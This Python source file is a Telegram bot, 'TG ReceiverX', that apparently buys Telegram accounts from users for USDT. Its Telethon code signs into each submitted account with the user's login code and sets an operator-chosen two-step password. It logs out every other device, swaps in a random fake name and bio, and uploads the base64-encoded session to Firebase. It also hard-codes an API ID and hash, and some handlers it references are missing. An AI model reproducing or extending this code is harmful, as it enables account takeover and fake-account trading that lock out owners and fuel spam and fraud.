import os
import time
import random
import requests
import telebot
import asyncio
import threading
import logging
import base64
from concurrent.futures import ThreadPoolExecutor
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
from telethon import TelegramClient
from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError, PasswordHashInvalidError
from telethon.tl.functions.account import GetAuthorizationsRequest, ResetAuthorizationRequest, UpdateProfileRequest, GetPasswordRequest

# --- LOGGING CONFIGURATION (Railway Clean Output) ---
logging.basicConfig(level=logging.ERROR)
logger = logging.getLogger("TeleBot")
logger.setLevel(logging.ERROR)

# Configurations
TOKEN = os.getenv("BOT_TOKEN", "YOUR_BOT_TOKEN_HERE")
CHANNEL_USERNAME = "@TG_RX_Update"
CHANNEL_URL = "https://t.me/TG_RX_Update"

# Firebase Realtime Database Configuration from Environment Variables
FIREBASE_DB_URL = os.getenv("FIREBASE_DB_URL")

# Default fallback API credentials
DEFAULT_API_ID = 37704841
DEFAULT_API_HASH = "171dfa442154fd339cc8ca4a5071c467"

bot = telebot.TeleBot(TOKEN, parse_mode="HTML")
user_states = {}

# --- HTTP SESSION & THREAD POOL FOR HIGH CONCURRENCY ---
http_session = requests.Session()
executor = ThreadPoolExecutor(max_workers=100)

def get_api_credentials():
    try:
        res = http_session.get(f"{FIREBASE_DB_URL}/settings.json", timeout=5)
        if res.status_code == 200 and res.json():
            data = res.json()
            # Handle both dictionary or list format from Firebase
            if isinstance(data, dict):
                settings = list(data.values())[0] if data else {}
            elif isinstance(data, list) and len(data) > 0:
                settings = data[0]
            else:
                settings = {}
            
            api_id = settings.get("api_id")
            api_hash = settings.get("api_hash")
            if api_id and api_hash:
                return int(api_id), str(api_hash)
    except Exception:
        pass
    return DEFAULT_API_ID, DEFAULT_API_HASH

def get_country_codes_from_db():
    try:
        res = http_session.get(f"{FIREBASE_DB_URL}/country_codes.json", timeout=5)
        if res.status_code == 200 and res.json():
            data = res.json()
            if isinstance(data, dict):
                return data
            elif isinstance(data, list):
                # Convert list to dictionary keyed by key/id
                return {str(item.get("key", i)): item for i, item in enumerate(data) if item}
        return {}
    except Exception:
        return {}

def is_number_already_used(phone_number):
    try:
        clean_phone = phone_number.replace('+', '')
        
        # Check used_numbers
        res_used = http_session.get(f"{FIREBASE_DB_URL}/used_numbers.json", timeout=5)
        if res_used.status_code == 200 and res_used.json():
            data = res_used.json()
            items = data.values() if isinstance(data, dict) else data
            for item in items:
                if isinstance(item, dict) and str(item.get("phone", "")).replace('+', '') == clean_phone:
                    return True

        # Check sessions
        res_sess = http_session.get(f"{FIREBASE_DB_URL}/sessions.json", timeout=5)
        if res_sess.status_code == 200 and res_sess.json():
            data = res_sess.json()
            items = data.values() if isinstance(data, dict) else data
            for item in items:
                if isinstance(item, dict) and str(item.get("phone", "")).replace('+', '') == clean_phone:
                    return True
        
        # Check accounts
        res_acc = http_session.get(f"{FIREBASE_DB_URL}/accounts.json", timeout=5)
        if res_acc.status_code == 200 and res_acc.json():
            data = res_acc.json()
            if isinstance(data, dict):
                for user_entries in data.values():
                    if isinstance(user_entries, dict):
                        for acc in user_entries.values():
                            if isinstance(acc, dict) and str(acc.get("phone", "")).replace('+', '') == clean_phone:
                                return True
    except Exception:
        pass
    return False

def decrease_country_count_in_db(country_key):
    try:
        res = http_session.get(f"{FIREBASE_DB_URL}/country_codes/{country_key}.json", timeout=5)
        if res.status_code == 200 and res.json():
            country_data = res.json()
            if isinstance(country_data, dict):
                count_val = country_data.get("count", 0)
                try:
                    current_count = int(count_val)
                except:
                    current_count = 0
                if current_count > 0:
                    new_count = current_count - 1
                    http_session.patch(
                        f"{FIREBASE_DB_URL}/country_codes/{country_key}.json",
                        json={"count": new_count},
                        timeout=5
                    )
    except Exception:
        pass

def check_user_verification(user_id):
    try:
        member = bot.get_chat_member(CHANNEL_USERNAME, user_id)
        return member.status in ['creator', 'administrator', 'member']
    except Exception:
        return False

def get_user_data_from_db(user_id):
    try:
        res = http_session.get(f"{FIREBASE_DB_URL}/users/{user_id}.json", timeout=5)
        if res.status_code == 200 and res.json():
            row = res.json()
            if isinstance(row, dict):
                return {
                    "main": float(row.get("main", 0)),
                    "hold": float(row.get("hold", 0)),
                    "withdrawPending": float(row.get("withdraw_pending", 0)),
                    "successCount": int(row.get("success_count", 0)),
                    "loginId": row.get("login_id")
                }
    except Exception:
        pass
    return { "main": 0, "hold": 0, "withdrawPending": 0, "successCount": 0 }

def save_user_data_to_db(user_id, data):
    try:
        payload = {
            "user_id": str(user_id),
            "main": float(data.get("main", 0)),
            "hold": float(data.get("hold", 0)),
            "withdraw_pending": float(data.get("withdrawPending", 0)),
            "success_count": int(data.get("successCount", 0)),
            "login_id": str(data.get("loginId")) if data.get("loginId") else None
        }
        http_session.patch(
            f"{FIREBASE_DB_URL}/users/{user_id}.json",
            json=payload,
            timeout=5
        )
    except Exception:
        pass

def generate_passcode(user_id):
    user_data = get_user_data_from_db(user_id)
    if "loginId" in user_data and user_data["loginId"]:
        return user_data["loginId"]
    
    login_id = str(random.randint(100000000000000, 999999999999999))
    user_data["loginId"] = login_id
    save_user_data_to_db(user_id, user_data)
    return login_id

def save_account_to_db(user_id, phone, country, status="Verified"):
    try:
        timestamp = int(time.time() * 1000)
        payload = {
            "id": f"{user_id}_{timestamp}",
            "user_id": str(user_id),
            "phone": phone,
            "country": country.get("name", "Unknown"),
            "flag": country.get("flag", "🏳️"),
            "price": float(country.get("price", 0)),
            "status": status,
            "timestamp": timestamp
        }
        http_session.put(
            f"{FIREBASE_DB_URL}/accounts/{user_id}/{timestamp}.json",
            json=payload,
            timeout=5
        )
    except Exception:
        pass

def save_session_to_firebase(user_id, session_name, phone):
    try:
        session_file = f"{session_name}.session"
        if os.path.exists(session_file):
            with open(session_file, "rb") as f:
                session_bytes = f.read()
            session_b64 = base64.b64encode(session_bytes).decode('utf-8')
            
            clean_phone = phone.replace('+', '')
            payload = {
                "id": f"{user_id}_{clean_phone}",
                "user_id": str(user_id),
                "phone": phone,
                "session_string": session_b64,
                "timestamp": int(time.time() * 1000)
            }
            http_session.put(
                f"{FIREBASE_DB_URL}/sessions/{user_id}_{clean_phone}.json",
                json=payload,
                timeout=5
            )
    except Exception:
        pass

def add_hold_balance_to_db(user_id, country_price, phone, country):
    user_data = get_user_data_from_db(user_id)
    user_data["hold"] = float(user_data.get("hold", 0)) + float(country_price)
    save_user_data_to_db(user_id, user_data)
    save_account_to_db(user_id, phone, country, status="Hold/Checking")

async def request_otp_code(phone, session_name):
    api_id, api_hash = get_api_credentials()
    client = TelegramClient(session_name, api_id, api_hash)
    try:
        await client.connect()
        if not await client.is_user_authorized():
            sent = await client.send_code_request(phone)
            return {"status": "success", "phone_code_hash": sent.phone_code_hash}
        return {"status": "already_authorized"}
    except Exception as e:
        return {"status": "error", "message": str(e)}
    finally:
        try:
            await client.disconnect()
        except:
            pass

async def perform_telethon_login_and_secure(phone, code, phone_code_hash, session_name):
    api_id, api_hash = get_api_credentials()
    client = TelegramClient(session_name, api_id, api_hash)
    try:
        await client.connect()
        if not await client.is_user_authorized():
            try:
                await client.sign_in(phone=phone, code=code, phone_code_hash=phone_code_hash)
            except SessionPasswordNeededError:
                return {"status": "has_2fa_active"}
        
        try:
            password_info = await client(GetPasswordRequest())
            if password_info and password_info.has_password:
                return {"status": "has_2fa_active"}
        except Exception:
            pass

        is_spammed = True 
        try:
            spambot_entity = await client.get_entity("@SpamBot")
            await client.send_message(spambot_entity, "/start")
            await asyncio.sleep(4) 
            messages = await client.get_messages(spambot_entity, limit=3)
            for msg in messages:
                if msg.out:
                    continue
                text_lower = msg.message.lower()
                if "no limits" in text_lower or "free as a bird" in text_lower or "good news" in text_lower:
                    is_spammed = False
                    break
                if any(word in text_lower for word in ["unfortunately", "restricted", "limit", "banned"]):
                    is_spammed = True
                    break
        except Exception:
            is_spammed = False 

        if is_spammed:
            return {"status": "spammed"}

        try:
            new_2fa_pass = "RxBot" + "".join(random.choices("0123456789abcdef", k=6))
            await client.edit_2fa(new_password=new_2fa_pass)
        except Exception:
            pass

        logout_success = True
        active_devices_list = []
        try:
            auths = await client(GetAuthorizationsRequest())
            for auth in auths.authorizations:
                if not auth.current:
                    device_name = f"{auth.device_model or 'Unknown Device'} ({auth.platform or 'Unknown Platform'}) - {auth.app_name or ''}"
                    active_devices_list.append(device_name)
                    try:
                        await client(ResetAuthorizationRequest(hash=auth.hash))
                    except Exception:
                        logout_success = False
        except Exception:
            logout_success = False

        try:
            first_names = ["Alex", "David", "Michael", "John", "Robert", "William", "James", "Daniel", "Chris", "Ryan"]
            last_names = ["Smith", "Johnson", "Brown", "Taylor", "Miller", "Wilson", "Anderson", "Thomas", "Jackson", "White"]
            rand_first = random.choice(first_names)
            rand_last = random.choice(last_names)
            letters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ "
            rand_bio = ''.join(random.choice(letters) for _ in range(40))

            await client(UpdateProfileRequest(first_name=rand_first, last_name=rand_last, about=rand_bio))
        except Exception:
            pass

        return {
            "status": "success",
            "logout_success": logout_success,
            "active_devices": active_devices_list
        }

    except PhoneCodeInvalidError:
        return {"status": "invalid_code"}
    except PasswordHashInvalidError:
        return {"status": "has_2fa_active"}
    except Exception as e:
        return {"status": "error", "message": str(e)}
    finally:
        try:
            await client.disconnect()
        except:
            pass

def run_async_request_code(phone, session_name):
    try:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        result = loop.run_until_complete(request_otp_code(phone, session_name))
        loop.close()
        return result
    except Exception as e:
        return {"status": "error", "message": str(e)}

def run_async_login_and_secure(phone, code, phone_code_hash, session_name):
    try:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        result = loop.run_until_complete(perform_telethon_login_and_secure(phone, code, phone_code_hash, session_name))
        loop.close()
        return result
    except Exception as e:
        return {"status": "error", "message": str(e)}

async def async_check_remaining_devices(session_name):
    api_id, api_hash = get_api_credentials()
    client = TelegramClient(session_name, api_id, api_hash)
    remaining_devices = []
    try:
        await client.connect()
        if await client.is_user_authorized():
            auths = await client(GetAuthorizationsRequest())
            for auth in auths.authorizations:
                if not auth.current:
                    d_name = f"{auth.device_model or 'Device'} ({auth.platform or 'Platform'})"
                    remaining_devices.append(d_name)
    except Exception:
        pass
    finally:
        try:
            await client.disconnect()
        except:
            pass
    return remaining_devices

def run_async_check_devices(session_name):
    try:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        res = loop.run_until_complete(async_check_remaining_devices(session_name))
        loop.close()
        return res
    except:
        return []

def process_account_result_after_delay(chat_id, sent_msg_id, user_id, phone_num, country, country_key, session_name):
    try:
        wait_time = int(country.get('timer', 90000))
    except:
        wait_time = 90000

    time.sleep(wait_time)
    
    session_file = f"{session_name}.session"
    price = float(country.get('price', 0))

    if not os.path.exists(session_file):
        try:
            bot.delete_message(chat_id, sent_msg_id)
        except Exception:
            pass

        user_data = get_user_data_from_db(user_id)
        if float(user_data.get("hold", 0)) >= price:
            user_data["hold"] = float(user_data.get("hold", 0)) - price
        save_user_data_to_db(user_id, user_data)
        save_account_to_db(user_id, phone_num, country, status="Verification Failed - Session Missing or Expired")

        fail_text = (
            f"<b>❌ Verification Failed!</b>\n\n"
            f"<blockquote>"
            f"📱 Number: <code>{phone_num}</code>\n"
            f"⚠️ Session file was not found or has expired after timer completion.\n\n"
            f"❌ Therefore, verification failed and <b>${price:.2f}</b> has been deducted from your hold balance."
            f"</blockquote>"
        )
        bot.send_message(chat_id, fail_text)
        return

    other_devices = run_async_check_devices(session_name)
    if other_devices:
        try:
            bot.delete_message(chat_id, sent_msg_id)
        except Exception:
            pass

        user_data = get_user_data_from_db(user_id)
        if float(user_data.get("hold", 0)) >= price:
            user_data["hold"] = float(user_data.get("hold", 0)) - price
        save_user_data_to_db(user_id, user_data)
        save_account_to_db(user_id, phone_num, country, status="Verification Failed - Active Devices Found")

        devices_str = "\n".join([f"• <code>{d}</code>" for d in other_devices])
        fail_text = (
            f"<b>❌ Verification Failed!</b>\n\n"
            f"<blockquote>"
            f"📱 Number: <code>{phone_num}</code>\n"
            f"⚠️ Active other devices detected before timer completion:\n"
            f"{devices_str}\n\n"
            f"❌ Because other devices are still active, your account verification has failed and <b>${price:.2f}</b> has been deducted from your hold balance."
            f"</blockquote>"
        )
        bot.send_message(chat_id, fail_text)

        try:
            os.remove(session_file)
        except:
            pass
        return

    try:
        bot.delete_message(chat_id, sent_msg_id)
    except Exception:
        pass

    user_data = get_user_data_from_db(user_id)
    if float(user_data.get("hold", 0)) >= price:
        user_data["hold"] = float(user_data.get("hold", 0)) - price
    user_data["main"] = float(user_data.get("main", 0)) + price
    user_data["successCount"] = int(user_data.get("successCount", 0)) + 1
    save_user_data_to_db(user_id, user_data)
    
    save_session_to_firebase(user_id, session_name, phone_num)
    save_account_to_db(user_id, phone_num, country, status="Verified Successfully")

    if country_key:
        decrease_country_count_in_db(country_key)

    final_success_text = (
        f"<b>✅ Congratulations!</b>\n"
        f"Account verification successful.\n\n"
        f"<blockquote>"
        f"🌍 Country: {country.get('name', 'Unknown')} {country.get('flag', '🏳️')}\n"
        f"📱 Number: <code>{phone_num}</code>\n"
        f"💰 Price: <b>${price:.2f} USD</b>\n"
        f"</blockquote>\n\n"
        f"✨ Your hold balance has been successfully added to your main balance, and clean session saved securely!"
    )
    bot.send_message(chat_id, final_success_text)

    if os.path.exists(session_file):
        try:
            os.remove(session_file)
        except:
            pass

def listen_withdraw_requests():
    while True:
        try:
            res = http_session.get(f"{FIREBASE_DB_URL}/withdraw_requests.json", timeout=10)
            if res.status_code == 200 and res.json():
                data = res.json()
                if isinstance(data, dict):
                    for req_key, req_info in data.items():
                        if isinstance(req_info, dict):
                            status = req_info.get("status")
                            user_id = req_info.get("user_id")
                            amount = req_info.get("amount")
                            network = req_info.get("network")
                            address = req_info.get("address")
                            raw_amount = req_info.get("raw_amount", 0)

                            if status == "approved":
                                try:
                                    acc_res = http_session.get(f"{FIREBASE_DB_URL}/accounts/{user_id}.json", timeout=5)
                                    if acc_res.status_code == 200 and acc_res.json():
                                        user_accs = acc_res.json()
                                        if isinstance(user_accs, dict):
                                            for acc_key, acc_detail in user_accs.items():
                                                if isinstance(acc_detail, dict):
                                                    phone_val = acc_detail.get("phone", "").replace("+", "")
                                                    if phone_val:
                                                        used_payload = {
                                                            "phone": phone_val,
                                                            "user_id": str(user_id),
                                                            "withdrawn_timestamp": int(time.time() * 1000)
                                                        }
                                                        http_session.patch(f"{FIREBASE_DB_URL}/used_numbers/{user_id}_{phone_val}.json", json=used_payload, timeout=5)
                                            
                                            http_session.delete(f"{FIREBASE_DB_URL}/accounts/{user_id}.json", timeout=5)
                                except Exception:
                                    pass

                                success_msg = (
                                    f"✅ Withdrawal Successful\n"
                                    f"Your withdrawal request of {amount} USDT has been successfully processed.\n\n"
                                    f"Amount: {amount} USDT\n"
                                    f"Network: {network}\n"
                                    f"Address: {address}\n\n"
                                    f"✅ Status: Successfully Completed"
                                )
                                try:
                                    bot.send_message(user_id, success_msg)
                                except Exception:
                                    pass
                                
                                http_session.delete(f"{FIREBASE_DB_URL}/withdraw_requests/{req_key}.json", timeout=5)

                            elif status == "rejected":
                                user_data = get_user_data_from_db(user_id)
                                user_data["main"] = float(user_data.get("main", 0)) + float(raw_amount)
                                save_user_data_to_db(user_id, user_data)

                                fail_msg = (
                                    f"❌ Withdrawal Rejected\n"
                                    f"Your withdrawal request of {amount} USDT has been rejected.\n"
                                    f"Please contact our Support Team for further assistance or clarification.\n\n"
                                    f"⚠️ Action Required: Contact Support"
                                )
                                try:
                                    bot.send_message(user_id, fail_msg)
                                except Exception:
                                    pass

                                http_session.delete(f"{FIREBASE_DB_URL}/withdraw_requests/{req_key}.json", timeout=5)
        except Exception:
            pass
        
        time.sleep(10)

def send_verification_message(chat_id):
    markup = InlineKeyboardMarkup()
    btn1 = InlineKeyboardButton('📢 Join Channel', url=CHANNEL_URL)
    btn2 = InlineKeyboardButton('✅ Verify Now', callback_data='check_subscription')
    
    markup.add(btn1)
    markup.add(btn2)
    
    msg_text = (
        "<b>⚠️ Channel Verification Required!</b>\n\n"
        "<blockquote>📢 Please join our official channel first to use this bot! 👇</blockquote>\n\n"
        "✨ Complete verification to proceed smoothly."
    )
    bot.send_message(chat_id, msg_text, reply_markup=markup)

@bot.message_handler(commands=['start'])
def handle_start(message):
    executor.submit(process_start_command, message)

def process_start_command(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    first_name = message.from_user.first_name or "User"
    
    if check_user_verification(user_id):
        generate_passcode(user_id)
        start_text = (
            f"<b>👋 Hello, {first_name}!</b>\n\n"
            f"🤖 Welcome to <b>TG ReceiverX Bot!</b>\n\n"
            f"<blockquote>"
            f"📱 Please send your correct phone number with the country code,\n"
            f"💡 Example: <code>+353XXXXXXXXX</code>\n"
            f"</blockquote>\n\n"
            f"⚙️ Select a menu button or send your number to continue."
        )
        bot.send_message(chat_id, start_text, reply_markup=telebot.types.ReplyKeyboardRemove())
    else:
        send_verification_message(chat_id)

@bot.message_handler(commands=['history'])
def handle_history(message):
    executor.submit(process_history_command, message)

def process_history_command(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    if not check_user_verification(user_id):
        send_verification_message(chat_id)
        return

    passcode = generate_passcode(user_id)
    web_app_url = "https://tg-rx-dashbord.netlify.app"
    markup = InlineKeyboardMarkup()
    
    btn_dash = InlineKeyboardButton('📊 Open Dashboard', web_app=telebot.types.WebAppInfo(url=web_app_url))
    btn_menu = InlineKeyboardButton('🔙 Main Menu', callback_data='main_menu')

    markup.add(btn_dash)
    markup.add(btn_menu)
    
    text = (
        "<b>📊 TG ReceiverX - Activity Log</b>\n\n"
        f"<blockquote>"
        f"🔑 Login ID: <code>{passcode}</code>\n\n"
        f"💡 This is your unique 15-digit identifier for the web dashboard.\n"
        f"</blockquote>\n\n"
        f"✨ Access your dashboard securely anytime."
    )
    bot.send_message(chat_id, text, reply_markup=markup)

@bot.message_handler(commands=['capacity'])
def handle_capacity(message):
    executor.submit(process_capacity_command, message)

def process_capacity_command(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    if not check_user_verification(user_id):
        send_verification_message(chat_id)
        return

    country_codes = get_country_codes_from_db()
    if not country_codes:
        bot.send_message(chat_id, "<b>⚠️ No country data available in database right now!</b>")
        return

    messages = []
    current_text = "<b>🌍 Available Countries & Rates:</b>\n\n"
    count_in_current_msg = 0

    items = list(country_codes.items())
    total_items = len(items)

    for idx, (key, val) in enumerate(items):
        if not isinstance(val, dict):
            continue
        timer_sec = int(val.get('timer', 90000))
        hours_val = timer_sec / 3600
        price_val = float(val.get('price', 0))
        
        country_block = (
            f"<blockquote>"
            f"{val.get('flag', '🏳️')} <b>{val.get('code', '')} {val.get('name', '')}</b> | 💵 Clean: <b>${price_val:.2f}</b>\n"
            f"⚠️ Spam: ({val.get('spam', 'not accepted')}) | 📦 Available: <code>{val.get('count', '0')}</code> left\n"
            f"⏱️ Timer: <code>{hours_val:.1f} Hours ({timer_sec}s)</code>"
            f"</blockquote>\n"
        )

        if count_in_current_msg >= 25 or len(current_text) + len(country_block) > 3800:
            messages.append(current_text)
            current_text = "<b>🌍 Available Countries & Rates (Cont.):</b>\n\n"
            count_in_current_msg = 0

        current_text += country_block
        count_in_current_msg += 1

        if idx == total_items - 1:
            current_text += "✨ Choose your target country code safely."

    if current_text:
        messages.append(current_text)

    for i, msg_chunk in enumerate(messages):
        if i > 0:
            msg_chunk = msg_chunk.replace("<b>🌍 Available Countries & Rates (Cont.):</b>\n\n", "", 1)
        bot.send_message(chat_id, msg_chunk)

@bot.message_handler(commands=['withdraw'])
def handle_withdraw(message):
    executor.submit(process_withdraw_command, message)

def process_withdraw_command(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    if not check_user_verification(user_id):
        send_verification_message(chat_id)
        return

    user_data = get_user_data_from_db(user_id)
    success_count = int(user_data.get("successCount", 0))

    if success_count < 5:
        bot.send_message(
            chat_id,
            f"<b>🔒 Withdrawal Locked !</b>\n\n"
            f"<blockquote>You cannot withdraw right now. You must successfully complete at least 5 accounts.</blockquote>\n\n"
            f"<b>📊 Successfully Completed: {success_count}/5</b>"
        )
        return

    markup = InlineKeyboardMarkup()
    btn_usdt = InlineKeyboardButton('💠 USDT (BEP20)', callback_data='withdraw_usdt_selected')
    btn_trx = InlineKeyboardButton('🔷 TRX (TRC20)', callback_data='withdraw_trx_selected')
    btn_menu = InlineKeyboardButton('🔙 Main Menu', callback_data='main_menu')

    markup.add(btn_usdt)
    markup.add(btn_trx)
    markup.add(btn_menu)
    
    stats = get_user_data_from_db(user_id)
    text = (
        "<b>💳 Withdraw Gateway</b>\n\n"
        f"<blockquote>"
        f"💰 Current Main Balance: <b>{float(stats.get('main', 0)):.2f} USDT</b>\n\n"
        f"🔗 Select your preferred network below 👇\n"
        f"</blockquote>\n\n"
        f"✨ Ensure your wallet address is correct before proceeding."
    )
    sent_msg = bot.send_message(chat_id, text, reply_markup=markup)
    
    user_states[user_id] = {
        'step': 'awaiting_withdraw_method',
        'last_msg_id': sent_msg.message_id,
        'timer_start': time.time()
    }

@bot.message_handler(commands=['balance'])
def handle_balance(message):
    executor.submit(process_balance_command, message)

def process_balance_command(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    if not check_user_verification(user_id):
        send_verification_message(chat_id)
        return

    bal = get_user_data_from_db(user_id)
    first_name = message.from_user.first_name or "User"

    markup = InlineKeyboardMarkup()
    btn_wd = InlineKeyboardButton('💳 Withdraw Now', callback_data='withdraw_menu')
    markup.add(btn_wd)

    text = (
        f"<b>📊 TG ReceiverX - Balance Info</b>\n\n"
        f"👋 Hello, <b>{first_name}</b>!\n\n"
        f"<blockquote>"
        f"🆔 USER ID: <code>{user_id}</code>\n"
        f"🏷️ Username: @{message.from_user.username if message.from_user.username else 'None'}\n"
        f"💵 Main Balance: <b>{float(bal.get('main', 0)):.2f} USDT</b>\n"
        f"⏳ Hold Balance: <b>{float(bal.get('hold', 0)):.2f} USDT</b>\n"
        f"</blockquote>\n\n"
        f"Thank you for using TG ReceiverX!"
    )
    bot.send_message(chat_id, text, reply_markup=markup)

@bot.message_handler(commands=['sup'])
def handle_support(message):
    executor.submit(process_support_command, message)

def process_support_command(message):
    chat_id = message.chat.id
    markup = InlineKeyboardMarkup()
    btn_sup = InlineKeyboardButton('👥 Support Team', url='https://t.me/Help_TG_RX')
    btn_chan = InlineKeyboardButton('📢 Update Channels', url=CHANNEL_URL)

    markup.add(btn_sup)
    markup.add(btn_chan)
    
    text = (
        "<b>🛡️ Support Center</b>\n\n"
        "<blockquote>"
        "💡 Need assistance? Reach out to our expert team or join our update channels below. 👇\n"
        "</blockquote>\n\n"
        "✨ We are available 24/7 to help you!"
    )
    bot.send_message(chat_id, text, reply_markup=markup)

@bot.callback_query_handler(func=lambda call: True)
def handle_callbacks(call):
    executor.submit(process_callback_query, call)

def process_callback_query(call):
    user_id = call.from_user.id
    chat_id = call.message.chat.id
    message_id = call.message.message_id
    data = call.data
    first_name = call.from_user.first_name or "User"

    if data == 'check_subscription':
        if check_user_verification(user_id):
            generate_passcode(user_id)
            try:
                bot.answer_callback_query(call.id, '✅ Verified successfully!')
                bot.delete_message(chat_id, message_id)
            except Exception:
                pass
            
            start_text = (
                f"<b>👋 Hello, {first_name}!</b>\n\n"
                f"🤖 Welcome to <b>TG ReceiverX Bot!</b>\n\n"
                f"<blockquote>"
                f"📱 Please send your correct phone number with the country code,\n"
                f"💡 Example: <code>+353XXXXXXXXX</code>\n"
                f"</blockquote>\n\n"
                f"⚙ Select a menu button or send your phone number to continue."
            )
            bot.send_message(chat_id, start_text, reply_markup=telebot.types.ReplyKeyboardRemove())
        else:
            try:
                bot.answer_callback_query(call.id, '❌ You have not joined the channel yet!', show_alert=True)
            except Exception:
                pass

    elif data in ['withdraw_usdt', 'withdraw_trx', 'withdraw_menu', 'withdraw_usdt_selected', 'withdraw_trx_selected']:
        try:
            bot.answer_callback_query(call.id)
        except Exception:
            pass
        
        if user_id in user_states and user_states[user_id].get('step') == 'awaiting_withdraw_method':
            if time.time() - user_states[user_id].get('timer_start', 0) > 120:
                del user_states[user_id]
                try:
                    bot.delete_message(chat_id, message_id)
                except:
                    pass
                bot.send_message(chat_id, "<b>❌ Time Expired!</b>\n\n<blockquote>The 120-second timer has expired. Please start the withdrawal process again using /withdraw.</blockquote>")
                return

        user_data = get_user_data_from_db(user_id)
        success_count = int(user_data.get("successCount", 0))

        if success_count < 5:
            bot.send_message(
                chat_id,
                f"<b>🔒 Withdrawal Locked !</b>\n\n"
                f"<blockquote>You cannot withdraw right now. You must successfully complete at least 5 accounts to withdraw.</blockquote>\n\n"
                f"<b>📊 Successfully Completed: {success_count}/5</b>"
            )
            return

        net_type = "BEP20" if "usdt" in data or data == 'withdraw_menu' else "TRC20"
        if data in ['withdraw_usdt_selected', 'withdraw_trx_selected']:
            net_type = "BEP20" if "usdt" in data else "TRC20"
            user_states[user_id] = {
                'step': 'awaiting_withdraw_address',
                'network': net_type,
                'last_msg_id': message_id,
                'timer_start': time.time()
            }
            markup = InlineKeyboardMarkup()
            btn_cancel = InlineKeyboardButton('❌ Cancel Withdraw', callback_data='cancel_sale')
            markup.add(btn_cancel)
            
            current_main_bal = float(user_data.get('main', 0))
            prompt_text = (
                f"<b>💳 Withdraw via {net_type}</b>\n\n"
                f"<blockquote>"
                f"💰 Your Main Balance: <b>${current_main_bal:.2f} USDT</b>\n\n"
                f"📍 Please send your valid <b>{net_type}</b> deposit address below within <b>120 seconds</b>:\n"
                f"💡 {'BEP20 address starts with 0x (42 characters)' if net_type=='BEP20' else 'TRC20 address starts with letter T (34 characters)'}\n"
                f"</blockquote>\n\n"
                f"💬 Send your wallet address in chat now 👇"
            )
            try:
                bot.edit_message_text(
                    chat_id=chat_id,
                    message_id=message_id,
                    text=prompt_text,
                    reply_markup=markup
                )
            except Exception:
                bot.send_message(chat_id, prompt_text, reply_markup=markup)
            return

        stats = get_user_data_from_db(user_id)
        markup = InlineKeyboardMarkup()
        btn_u = InlineKeyboardButton('💠 USDT (BEP20)', callback_data='withdraw_usdt_selected')
        btn_t = InlineKeyboardButton('🔷 TRX (TRC20)', callback_data='withdraw_trx_selected')
        btn_m = InlineKeyboardButton('🔙 Main Menu', callback_data='main_menu')

        markup.add(btn_u)
        markup.add(btn_t)
        markup.add(btn_m)
        
        text = (
            "<b>💳 Withdraw Gateway</b>\n\n"
            f"<blockquote>"
            f"💰 Current Main Balance: <b>{float(stats.get('main', 0)):.2f} USDT</b>\n\n"
            f"🔗 Select your network below within <b>120 seconds</b> 👇\n"
            f"</blockquote>\n\n"
            f"✨ Choose your preferred secure payout method."
        )
        try:
            bot.edit_message_text(chat_id=chat_id, message_id=message_id, text=text, reply_markup=markup)
            user_states[user_id] = {
                'step': 'awaiting_withdraw_method',
                'last_msg_id': message_id,
                'timer_start': time.time()
            }
        except Exception:
            sent = bot.send_message(chat_id, text, reply_markup=markup)
            user_states[user_id] = {
                'step': 'awaiting_withdraw_method',
                'last_msg_id': sent.message_id,
                'timer_start': time.time()
            }

    elif data == 'confirm_withdraw_request':
        if user_id in user_states and user_states[user_id].get('step') == 'awaiting_withdraw_confirmation':
            if time.time() - user_states[user_id].get('timer_start', 0) > 120:
                del user_states[user_id]
                try:
                    bot.delete_message(chat_id, message_id)
                except:
                    pass
                bot.send_message(chat_id, "<b>❌ Time Expired!</b>\n\n<blockquote>The 120-second confirmation timer has expired. Withdrawal request cancelled.</blockquote>")
                return

            state = user_states[user_id]
            net_type = state['network']
            address = state['address']
            withdrawn_amount = state['amount']
            raw_main_bal = state['raw_amount']

            user_data = get_user_data_from_db(user_id)
            user_data["main"] = 0
            save_user_data_to_db(user_id, user_data)
            
            del user_states[user_id]

            req_id = f"wd_{user_id}_{int(time.time())}"
            req_payload = {
                "request_id": req_id,
                "user_id": str(user_id),
                "username": call.from_user.username or "None",
                "network": net_type,
                "address": address,
                "amount": str(withdrawn_amount),
                "raw_amount": float(raw_main_bal),
                "status": "pending",
                "timestamp": int(time.time() * 1000)
            }
            try:
                http_session.put(f"{FIREBASE_DB_URL}/withdraw_requests/{req_id}.json", json=req_payload, timeout=5)
            except Exception:
                pass

            success_withdraw_text = (
                f"<b>⏳ Withdrawal Request Submitted!</b>\n\n"
                f"<blockquote>"
                f"🌐 Network: <b>{net_type}</b>\n"
                f"📍 Address: <code>{address}</code>\n\n"
                f"💵 Withdrawal Amount: <b>${withdrawn_amount} USDT</b>\n\n"
                f"⏳ Status: Request submitted successfully! It will be reviewed via admin dashboard."
                f"</blockquote>"
            )
            try:
                bot.edit_message_text(chat_id=chat_id, message_id=message_id, text=success_withdraw_text)
            except Exception:
                bot.send_message(chat_id, success_withdraw_text)
        else:
            try:
                bot.answer_callback_query(call.id, "❌ Session expired or invalid!", show_alert=True)
            except:
                pass

    elif data == 'cancel_withdraw_request':
        if user_id in user_states:
            del user_states[user_id]
        try:
            bot.answer_callback_query(call.id, "✅ Withdrawal Cancelled!")
            bot.delete_message(chat_id, message_id)
        except Exception:
            pass
        bot.send_message(chat_id, "<b>❌ Withdrawal Cancelled Successfully</b>\n\n<blockquote>✨ Your balance remains untouched.</blockquote>")

    elif data == 'cancel_sale':
        if user_id in user_states:
            s_name = user_states[user_id].get('session_name')
            if s_name:
                s_file = f"{s_name}.session"
                if os.path.exists(s_file):
                    try:
                        os.remove(s_file)
                    except:
                        pass
            del user_states[user_id]
        try:
            bot.answer_callback_query(call.id, "✅ Action Cancelled Successfully!")
            bot.delete_message(chat_id, message_id)
        except Exception:
            pass
